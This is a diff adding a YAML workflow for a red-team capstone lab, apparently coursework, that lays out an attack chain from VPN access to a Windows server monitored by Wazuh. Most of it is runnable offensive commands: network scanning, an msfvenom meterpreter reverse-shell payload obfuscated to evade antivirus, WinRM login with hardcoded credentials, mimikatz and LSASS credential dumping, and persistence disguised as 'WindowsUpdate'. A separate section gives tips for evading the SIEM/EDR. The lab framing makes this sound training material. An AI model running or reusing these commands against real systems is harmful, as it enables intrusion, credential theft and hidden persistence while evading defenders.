@@ -1,0 +1,183 @@
+# Capstone Project Attack Chain Workflow
+# For Unified-PDP Red Team Operations
+# ========================================
+
+name: "capstone_attack_chain"
+description: "Full attack chain for capstone project: VPN → JumpServer → Internal → Windows Server"
+version: "1.0.0"
+
+lab_architecture:
+  vpn:
+    protocol: "SSTP"
+    port: 443
+    description: "VPN entry point with HTTPS tunneling"
+
+  jumpserver:
+    ip: "192.168.168.10"
+    role: "Bastion Host"
+    access: "SSH/RDP only"
+    description: "Single gateway for administrative access"
+
+  internal_network:
+    subnet: "10.10.10.0/24"
+    isolation: "Segmented from external network"
+    description: "Production servers (Web, DB, NFS, Windows)"
+
+  wazuh_siem:
+    ip: "10.10.10.12"
+    role: "SIEM + EDR"
+    ports:
+      - 1514  # Agent communication
+      - 1515  # Agent enrollment
+    description: "Centralized threat monitoring and alerting"
+
+  targets:
+    web_server: "10.10.10.10"
+    database: "10.10.10.11"
+    wazuh: "10.10.10.12"
+    windows_server: "10.10.10.13"
+    nfs_server: "10.10.10.14"
+
+attack_phases:
+  - phase: "1. Initial Access"
+    objective: "Connect to lab environment via VPN"
+    tools:
+      - "openconnect"
+      - "sstp-client"
+    commands:
+      - "openconnect --protocol=nc https://vpn-target:443"
+    success_criteria: "VPN connection established"
+    detection_risk: "Low - Normal VPN traffic"
+    mitre_technique: "T1071.001 (Web Protocols)"
+
+  - phase: "2. JumpServer Reconnaissance"
+    objective: "Enumerate JumpServer and identify internal network"
+    tools:
+      - "ssh"
+      - "nmap"
+      - "ip"
+    commands:
+      - "ssh admin@192.168.168.10"
+      - "ip addr show"
+      - "nmap -sS 10.10.10.0/24 -T4"
+    success_criteria: "Internal network discovered"
+    detection_risk: "Medium - Nmap scan may trigger Wazuh alerts"
+    mitre_technique: "T1046 (Network Service Scanning)"
+
+  - phase: "3. Payload Generation & Obfuscation"
+    objective: "Create obfuscated Windows payload"
+    tools:
+      - "msfvenom"
+      - "ObfuXtreme-like engine"
+    commands:
+      - "msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.100 LPORT=4444 -f exe -e x64/xor_dynamic -i 5 -o payload.exe"
+      - "python obfuscator.py payload.exe --intensity high"
+    success_criteria: "Obfuscated payload generated"
+    detection_risk: "Low - Local operation"
+    mitre_technique: "T1027 (Obfuscated Files or Information)"
+
+  - phase: "4. Lateral Movement to Windows Server"
+    objective: "Move from JumpServer to Windows Server (10.10.10.13)"
+    tools:
+      - "crackmapexec"
+      - "evil-winrm"
+      - "xfreerdp"
+    commands:
+      - "crackmapexec winrm 10.10.10.13 -u admin -p password123 -x whoami"
+      - "evil-winrm -i 10.10.10.13 -u admin -p password123"
+    success_criteria: "Command execution on Windows Server"
+    detection_risk: "High - WinRM activity logged by Wazuh"
+    mitre_technique: "T1021.006 (Windows Remote Management)"
+
+  - phase: "5. Privilege Escalation"
+    objective: "Escalate to SYSTEM on Windows Server"
+    tools:
+      - "mimikatz"
+      - "juicypotato"
+    commands:
+      - "mimikatz # privilege::debug"
+      - "mimikatz # token::elevate"
+    success_criteria: "SYSTEM-level access achieved"
+    detection_risk: "Very High - mimikatz detected by Wazuh EDR"
+    mitre_technique: "T1068 (Exploitation for Privilege Escalation)"
+
+  - phase: "6. Credential Harvesting"
+    objective: "Extract credentials from LSASS memory"
+    tools:
+      - "mimikatz"
+      - "procdump"
+    commands:
+      - "mimikatz # sekurlsa::logonpasswords"
+      - "procdump -ma lsass.exe lsass.dmp"
+    success_criteria: "Credentials extracted"
+    detection_risk: "Very High - LSASS access triggers EDR alerts"
+    mitre_technique: "T1003.001 (LSASS Memory)"
+
+  - phase: "7. Persistence"
+    objective: "Establish persistent access"
+    tools:
+      - "schtasks"
+      - "sc"
+    commands:
+      - "schtasks /create /tn 'WindowsUpdate' /tr 'C:\\Windows\\Temp\\payload.exe' /sc onstart /ru SYSTEM"
+      - "sc create UpdateService binpath= 'C:\\Windows\\Temp\\payload.exe' start= auto"
+    success_criteria: "Persistence mechanism installed"
+    detection_risk: "High - Service/task creation logged"
+    mitre_technique: "T1053.005 (Scheduled Task)"
+
+  - phase: "8. PoC Documentation"
+    objective: "Generate comprehensive PoC report for capstone"
+    tools:
+      - "Unified-PDP PoC Generator"
+    commands:
+      - "hs_generate_poc(poc_type='lateral_movement', target_server='10.10.10.13')"
+    success_criteria: "PoC report generated with all evidence"
+    detection_risk: "None - Documentation only"
+    mitre_technique: "N/A"
+
+wazuh_detection_evasion:
+  phase_2:
+    technique: "Slow scan with timing delays"
+    command: "nmap -sS 10.10.10.0/24 -T2 --max-rate 100"
+
+  phase_4:
+    technique: "Use legitimate admin tools"
+    command: "Use built-in PowerShell remoting instead of crackmapexec"
+
+  phase_5:
+    technique: "Obfuscated mimikatz execution"
+    command: "Run mimikatz from memory using reflective DLL injection"
+
+  phase_6:
+    technique: "Alternative credential access"
+    command: "Use DPAPI or registry SAM extraction instead of LSASS dump"
+
+  phase_7:
+    technique: "Living off the land"
+    command: "Use WMI event subscription instead of scheduled tasks"
+
+capstone_deliverables:
+  - "PoC Report: Lateral Movement (Markdown/PDF)"
+  - "PoC Report: Malware Deployment (Markdown/PDF)"
+  - "PoC Report: Privilege Escalation (Markdown/PDF)"
+  - "Wazuh Detection Analysis"
+  - "MITRE ATT&CK Mapping"
+  - "Remediation Recommendations"
+  - "Video Demonstration (optional)"
+
+success_metrics:
+  - "Successfully move laterally from JumpServer to Windows Server"
+  - "Deploy obfuscated payload that evades basic AV detection"
+  - "Achieve SYSTEM-level privileges"
+  - "Extract at least one set of credentials"
+  - "Establish persistence mechanism"
+  - "Document all steps with PoC reports"
+  - "Analyze Wazuh detection capabilities"
+
+timeline:
+  phase_1_2: "1-2 hours (VPN + Recon)"
+  phase_3: "30 minutes (Payload Gen)"
+  phase_4_5: "2-3 hours (Lateral Movement + Escalation)"
+  phase_6_7: "1-2 hours (Harvest + Persistence)"
+  phase_8: "2-3 hours (Documentation)"
+  total: "6-10 hours"
